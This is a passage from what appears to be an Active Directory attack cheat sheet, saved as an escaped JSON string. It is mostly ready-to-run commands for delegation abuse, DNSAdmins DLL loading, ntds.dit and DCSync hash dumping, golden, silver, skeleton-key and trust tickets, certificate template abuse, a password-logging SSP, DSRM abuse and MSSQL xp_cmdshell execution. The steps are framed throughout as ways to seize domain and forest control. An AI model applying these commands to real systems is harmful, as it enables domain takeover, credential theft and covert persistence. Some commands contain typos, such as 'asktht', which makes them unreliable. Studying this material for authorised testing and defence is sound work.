SPN>\n\n#Finally use mimikatz to ptt the TGS\nInvoke-Mimikatz -Command '\"kerberos::ptt <PathToTGS>\"'\n```\n\n_ALTERNATIVE:_\nUsing Rubeus:\n\n```powershell\nRubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:\"<Service's SPN>\" /altservice:<Optional> /ptt\n```\n\nNow we can access the service as the impersonated user!\n\n:triangular_flag_on_post: **What if we have delegation rights for only a specific SPN? (e.g TIME):**\n\nIn this case we can still abuse a feature of kerberos called \"alternative service\". This allows us to request TGS tickets for other \"alternative\" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.\n\n### Resource Based Constrained Delegation\n\n_WUT IS DIS?: \\\nTL;DR \\\nIf we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access._\n\nTools we are going to use:\n\n- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)\n- [Powermad](https://github.com/Kevin-Robertson/Powermad)\n- [Rubeus](https://github.com/GhostPack/Rubeus)\n\nFirst we need to enter the security context of the user/machine account that has the privileges over the object.\nIf it is a user account we can use Pass the Hash, RDP, PSCredentials etc.\n\nExploitation Example:\n\n```powershell\n#Import Powermad and use it to create a new MACHINE ACCOUNT\n. .\\Powermad.ps1\nNew-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose\n\n#Import PowerView and get the SID of our new created machine account\n. .\\PowerView.ps1\n$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid\n\n#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\n\n#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView\nGet-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose\n\n#After that we need to get the RC4 hash of the new machine account's password using Rubeus\nRubeus.exe hash /password:'p@ssword!'\n\n#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus\nRubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt\n\n#Finally we can access the C$ drive of the target machine\ndir \\\\TargetMachine.wtver.domain\\C$\n```\n\nDetailed Articles:\n\n- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)\n- [RESOURCE-BASED CONSTRAINED DELEGATION ABUSE](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)\n\n:exclamation: In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick \"tgt::deleg\" from kekeo or \"tgtdeleg\" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.\n\n```powershell\n#Command on Rubeus\nRubeus.exe tgtdeleg /nowrap\n```\n\nDetailed Article:\n[Rubeus – Now With More Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)\n\n### DNSAdmins Abuse\n\n_WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work._\n\n1. Enumerate the members of the DNSAdmins group:\n   - PowerView: `Get-NetGroupMember -GroupName \"DNSAdmins\"`\n   - AD Module: `Get-ADGroupMember -Identiny DNSAdmins`\n2. Once we found a member of this group we need to compromise it (There are many ways).\n3. Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:\n\n   ```powershell\n   #Using dnscmd:\n   dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\\\Path\\To\\Our\\Dll\\malicious.dll\n\n   #Restart the DNS Service:\n   sc \\\\DNSServer stop dns\n   sc \\\\DNSServer start dns\n   ```\n\n### Abusing Active Directory-Integraded DNS\n\n- [Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)\n- [ADIDNS Revisited](https://blog.netspi.com/adidns-revisited/)\n- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)\n\n### Abusing Backup Operators Group\n\n_WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators\ngroup, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC,\nextract the ntds.dit database file, dump the hashes and escalate our privileges to DA._\n\n1. Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:\n\n   ```powershell\n   #Create a .txt file that will contain the shadow copy process script\n   Script ->{\n   set context persistent nowriters\n   set metadata c:\\windows\\system32\\spool\\drivers\\color\\example.cab\n   set verbose on\n   begin backup\n   add volume c: alias mydrive\n\n   create\n\n   expose %mydrive% w:\n   end backup\n   }\n\n   #Execute diskshadow with our script as parameter\n   diskshadow /s script.txt\n   ```\n\n2. Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just\n   simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are\n   going to use [this](https://github.com/giuliano108/SeBackupPrivilege) amazing repo:\n\n   ```powershell\n   #Importing both dlls from the repo using powershell\n   Import-Module .\\SeBackupPrivilegeCmdLets.dll\n   Import-Module .\\SeBackupPrivilegeUtils.dll\n\n   #Checking if the SeBackupPrivilege is enabled\n   Get-SeBackupPrivilege\n\n   #If it isn't we enable it\n   Set-SeBackupPrivilege\n\n   #Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice\n   Copy-FileSeBackupPrivilege w:\\windows\\NTDS\\ntds.dit c:\\<PathToSave>\\ntds.dit -Overwrite\n\n   #Dump the SYSTEM hive\n   reg save HKLM\\SYSTEM c:\\temp\\system.hive\n   ```\n\n3. Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.\n4. Use secretsdump.py from impacket and dump the hashes.\n5. Use psexec or another tool of your choice to PTH and get Domain Admin access.\n\n### Abusing Exchange\n\n- [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)\n- [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)\n- [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange\n\n### Weaponizing Printer Bug\n\n- [Printer Server Bug to Domain Administrator](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)\n- [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)\n\n### Abusing ACLs\n\n- [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)\n- [aclpwn.py](https://github.com/fox-it/aclpwn.py)\n- [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)\n\n### Abusing IPv6 with mitm6\n\n- [Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)\n- [mitm6](https://github.com/fox-it/mitm6)\n\n### SID History Abuse\n\n_WUT IS DIS?: If we manage to compromise a child domain of a forest and [SID filtering](https://www.itprotoday.com/windows-8/sid-filtering) isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the [SID History](https://www.itprotoday.com/windows-8/sid-history) field on a kerberos TGT ticket, that defines the \"extra\" security groups and privileges._\n\nExploitation example:\n\n```powershell\n#Get the SID of the Current Domain using PowerView\nGet-DomainSID -Domain current.root.domain.local\n\n#Get the SID of the Root Domain using PowerView\nGet-DomainSID -Domain root.domain.local\n\n#Create the Enteprise Admins SID\nFormat: RootDomainSID-519\n\n#Forge \"Extra\" Golden Ticket using mimikatz\nkerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\\path\\to\\ticket\\golden.kirbi\n\n#Inject the ticket into memory\nkerberos::ptt \\path\\to\\ticket\\golden.kirbi\n\n#List the DC of the Root Domain\ndir \\\\dc.root.domain.local\\C$\n\n#Or DCsync and dump the hashes using mimikatz\nlsadump::dcsync /domain:root.domain.local /all\n```\n\nDetailed Articles:\n\n- [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)\n- [A Guide to Attacking Domain Trusts](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)\n\n### Exploiting SharePoint\n\n- [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) RCE Exploitation \\\n  [PoC](https://github.com/k8gege/CVE-2019-0604)\n- [CVE-2019-1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization) Code execution through BDC deserialization\n- [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) RCE using typeconverters \\\n  [PoC](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)\n\n### Zerologon\n\n- [Zerologon: Unauthenticated domain controller compromise](https://www.secura.com/whitepapers/zerologon-whitepaper): White paper of the vulnerability.\n- [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): C# implementation of the Zerologon exploit.\n- [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon): PowerShell implementation of the Zerologon exploit.\n- [Zer0Dump](https://github.com/bb00/zer0dump): Python implementation of the Zerologon exploit using the impacket library.\n\n### PrintNightmare\n\n- [CVE-2021-34527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527): Vulnerability details.\n- [Impacket implementation of PrintNightmare](https://github.com/cube0x0/CVE-2021-1675): Reliable PoC of PrintNightmare using the impacket library.\n- [C# Implementation of CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare): Reliable PoC of PrintNightmare written in C#.\n\n### Active Directory Certificate Services\n\n**Check for Vulnerable Certificate Templates with:** [Certify](https://github.com/GhostPack/Certify)\n\n_Note: Certify can be executed with Cobalt Strike's `execute-assembly` command as well_\n\n```powershell\n.\\Certify.exe find /vulnerable /quiet\n```\n\nMake sure the msPKI-Certificates-Name-Flag value is set to \"ENROLLEE_SUPPLIES_SUBJECT\" and that the Enrollment Rights\nallow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the \"Client Authentication\" value as well as that the \"Authorized Signatures Required\" parameter is set to 0.\n\nThis exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin (\"DA\")\nand use the captured certificate with Rubeus to forge authentication.\n\n_Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target._\n\nRequest the DA's Account Certificate with Certify\n\n```powershell\n.\\Certify.exe request /template:<Template Name> /quiet /ca:\"<CA Name>\" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Domain Admin AltName> /machine\n```\n\nThis should return a valid certificate for the associated DA account.\n\nThe exported `cert.pem` and `cert.key` files must be consolidated into a single `cert.pem` file, with one gap of whitespace between the `END RSA PRIVATE KEY` and the `BEGIN CERTIFICATE`.\n\n_Example of `cert.pem`:_\n\n```\n-----BEGIN RSA PRIVATE KEY-----\nBIIEogIBAAk15x0ID[...]\n[...]\n[...]\n-----END RSA PRIVATE KEY-----\n\n-----BEGIN CERTIFICATE-----\nBIIEogIBOmgAwIbSe[...]\n[...]\n[...]\n-----END CERTIFICATE-----\n```\n\n#Utilize `openssl` to Convert to PKCS #12 Format\n\nThe `openssl` command can be utilized to convert the certificate file into PKCS #12 format (you may be required to enter an export password, which can be anything you like).\n\n```bash\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n```\n\nOnce the `cert.pfx` file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, `certutil.exe`, Cobalt Strike's upload functionality, etc.)\n\nAfter the `cert.pfx` file has been uploaded to the compromised host, [Rubeus](https://github.com/GhostPack/Rubeus) can be used to request a Kerberos TGT for the DA account which will then be imported into memory.\n\n```powershell\n.\\Rubeus.exe asktht /user:<Domain Admin AltName> /domain:<domain.com> /dc:<Domain Controller IP or Hostname> /certificate:<Local Machine Path to cert.pfx> /nowrap /ptt\n```\n\nThis should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.\n\n### No PAC\n\n- [sAMAccountname Spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing) Exploitation of CVE-2021-42278 and CVE-2021-42287\n- [Weaponisation of CVE-2021-42287/CVE-2021-42278](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html) Exploitation of CVE-2021-42278 and CVE-2021-42287\n- [noPAC](https://github.com/cube0x0/noPac) C# tool to exploit CVE-2021-42278 and CVE-2021-42287\n- [sam-the-admin](https://github.com/WazeHell/sam-the-admin) Python automated tool to exploit CVE-2021-42278 and CVE-2021-42287\n- [noPac](https://github.com/Ridter/noPac) Evolution of \"sam-the-admin\" tool\n\n## Domain Persistence\n\n### Golden Ticket Attack\n\n```powershell\n#Execute mimikatz on DC as DA to grab krbtgt hash:\nInvoke-Mimikatz -Command '\"lsadump::lsa /patch\"' -ComputerName <DC'sName>\n\n#On any machine:\nInvoke-Mimikatz -Command '\"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:\n<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"'\n```\n\n### DCsync Attack\n\n```powershell\n#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:<DomainName>\\<AnyDomainUser>\"'\n\n#DCsync using secretsdump.py from impacket with NTLM authentication\nsecretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm\n\n#DCsync using secretsdump.py from impacket with Kerberos Authentication\nsecretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm\n```\n\n**Tip:** \\\n /ptt -> inject ticket on current running session \\\n /ticket -> save the ticket on the system for later use\n\n### Silver Ticket Attack\n\n```powershell\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:\n<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt\"'\n```\n\n[SPN List](https://adsecurity.org/?page_id=183)\n\n### Skeleton Key Attack\n\n```powershell\n#Exploitation Command runned as DA:\nInvoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName <DC's FQDN>\n\n#Access using the password \"mimikatz\"\nEnter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\\Administrator\n```\n\n### DSRM Abuse\n\n_WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!_\n\n```powershell\n#Dump DSRM password (needs DA privs):\nInvoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"' -ComputerName <DC's Name>\n\n#This is a local account, so we can PTH and authenticate!\n#BUT we need to alter the behaviour of the DSRM account before pth:\n#Connect on DC:\nEnter-PSSession -ComputerName <DC's Name>\n\n#Alter the Logon behaviour on registry:\nNew-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehaviour\" -Value 2 -PropertyType DWORD -Verbose\n\n#If the property already exists:\nSet-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehaviour\" -Value 2 -Verbose\n```\n\nThen just PTH to get local admin access on DC!\n\n### Custom SSP\n\n_WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!_\n\nFrom powershell:\n\n```powershell\n#Get current Security Package:\n$packages = Get-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'\n\n#Append mimilib:\n$packages += \"mimilib\"\n\n#Change the new packages name\nSet-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\\" -Name 'Security Packages' -Value $packages\nSet-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name 'Security Packages' -Value $packages\n\n#ALTERNATIVE:\nInvoke-Mimikatz -Command '\"misc::memssp\"'\n```\n\nNow all logons on the DC are logged to -> C:\\Windows\\System32\\kiwissp.log\n\n## Cross Forest Attacks\n\n### Trust Tickets\n\n_WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT._\n\n:warning: The access we will have will be limited to what our DA account is configured to have on the other Forest!\n\n- Using Mimikatz:\n\n  ```powershell\n  #Dump the trust key\n  Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'\n  Invoke-Mimikatz -Command '\"lsadump::lsa /patch\"'\n\n  #Forge an inter-realm TGT using the Golden Ticket attack\n  Invoke-Mimikatz -Command '\"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:\n  <OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:\n  <PathToSaveTheGoldenTicket>\"'\n  ```\n\n  :exclamation: Tickets -> .kirbi format\n\n  Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!\n\n- Using Rubeus:\n\n  ```powershell\n  .\\Rubeus.exe asktgs /ticket:<kirbi file> /service:\"Service's SPN\" /ptt\n  ```\n\n### Abuse MSSQL Servers\n\n- Enumerate MSSQL Instances: `Get-SQLInstanceDomain`\n- Check Accessibility as current user:\n\n  ```powershell\n  Get-SQLConnectionTestThreaded\n  Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose\n  ```\n\n- Gather Information about the instance: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`\n- Abusing SQL Database Links: \\\n  _WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!_\n\nCheck for existing Database Links:\n\n```powershell\n#Check for existing Database Links:\n#PowerUpSQL:\nGet-SQLServerLink -Instance <SPN> -Verbose\n\n#MSSQL Query:\nselect * from master..sysservers\n```\n\nThen we can use queries to enumerate other links from the linked Database:\n\n```powershell\n#Manualy:\nselect * from openquery(\"LinkedDatabase\", 'select * from master..sysservers')\n\n#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):\nGet-SQLServerLinkCrawl -Instance <SPN> -Verbose\n\n# Enable RPC Out (Required to Execute XP_CMDSHELL)\nEXEC sp_serveroption 'sqllinked-hostname', 'rpc', 'true';\nEXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';\nselect * from openquery(\"SQL03\", 'EXEC sp_serveroption ''SQL03'',''rpc'',''true'';');\nselect * from openquery(\"SQL03\", 'EXEC sp_serveroption ''SQL03'',''rpc out'',''true'';');\n\n#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell\n#Or if it is disabled enable it:\nEXECUTE('sp_configure \"xp_cmdshell\",1;reconfigure;') AT \"SPN\"\n```\n\nQuery execution:\n\n```powershell\nGet-SQLServerLinkCrawl -Instace <SPN> -Query \"exec master..xp_cmdshell 'whoami'\"\n```\n\n### Breaking Forest Trusts\n\n_WUT IS DIS?: \\\nTL;DR \\\nIf we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest._\n\nTools we are going to use:\n\n- [Rubeus](https://github.com/GhostPack/Rubeus)\n- [SpoolSample](https://github.com/leechristensen/SpoolSample)\n- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n\nExploitation example:\n\n```powershell\n#Start monitoring for TGTs with rubeus:\nRubeus.exe monitor /interval:5 /filteruser:target-dc\n\n#Execute the printerbug to trigger the force authentication of the target DC to our machine\nSpoolSample.exe target-dc.external.forest.local dc.compromised.domain.local\n\n#Get the base64 captured TGT from Rubeus and inject it into memory:\nRubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>\n\n#Dump the hashes of the target domain using mimikatz:\nlsadump::dcsync /domain:external.forest.local /all\n```\n\nDetailed Articles:\n\n- [Not A Security Boundary: Breaking Forest Trusts](https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/)\n- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)\n", "timestamp": "2025-10-21T13:30:31.082115"}
